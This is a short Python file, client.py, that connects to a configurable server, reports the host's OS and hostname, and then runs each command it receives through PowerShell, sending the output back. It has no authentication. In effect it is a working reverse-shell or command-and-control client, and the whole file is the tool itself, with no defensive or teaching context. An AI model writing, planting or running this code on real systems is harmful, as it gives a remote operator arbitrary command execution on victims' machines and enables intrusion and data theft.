# client.py
import socket
import json
import platform
import subprocess
import sys
from typing import Dict, Union

# Server Configuration
SERVER_HOST = "127.0.0.1"           # Replace with the server's IP address
SERVER_PORT = 5000                  # Server's listening port

def send_json(connection: socket.socket, data: Dict) -> None:
    """
    Send a JSON object over a socket connection.
    """
    try:
        message = json.dumps(data) + "\n"   # Append newline as a delimiter
        connection.sendall(message.encode())
    except Exception as e:
        print(f"Error sending data: {e}")
        sys.exit(1)                         # Exit if sending fails

def receive_json(connection: socket.socket) -> Union[Dict, None]:
    """
    Receive a JSON object from a socket connection.
    """
    try:
        buffer = ""
        while True:
            data = connection.recv(1024).decode()
            if not data:
                return None                             # Connection closed
            buffer += data
            if "\n" in buffer:
                line, buffer = buffer.split("\n", 1)
                return json.loads(line)
    except Exception as e:
        print(f"Error receiving data: {e}")
        return None

def execute_powershell(command: str) -> str:
    """
    Execute a PowerShell command and return its output.
    """
    try:
        # Execute the PowerShell command as a subprocess
        completed = subprocess.run(
            ["powershell", "-Command", command],
            capture_output=True,
            text=True
        )
        output = completed.stdout + completed.stderr
        return output
    except Exception as e:
        return f"Error executing command: {e}"

def handle_commands(connection: socket.socket) -> None:
    """
    Listen for commands from the server, execute them, and send back the results.
    """
    while True:
        message = receive_json(connection)
        if not message:
            print("Disconnected from server.")
            break
        if "command" in message:
            cmd = message["command"]
            print(f"Received command: {cmd}")
            output = execute_powershell(cmd)
            response = {"output": output}
            send_json(connection, response)

def start_client() -> None:
    """
    Initialize the client, connect to the server, send system info, and start handling commands.
    """
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((SERVER_HOST, SERVER_PORT))
        print(f"Connected to server at {SERVER_HOST}:{SERVER_PORT}")
    except Exception as e:
        print(f"Unable to connect to server: {e}")
        sys.exit(1)

    # Send initial system information to the server
    client_info = {
        "os":       platform.system(),
        "hostname": platform.node()
    }
    send_json(client_socket, client_info)
    print("Sent system information to server.")

    try:
        handle_commands(client_socket)
    except KeyboardInterrupt:
        print("\nClient shutting down.")
    finally:
        client_socket.close()
        print("Connection closed.")

if __name__ == "__main__":
    start_client()
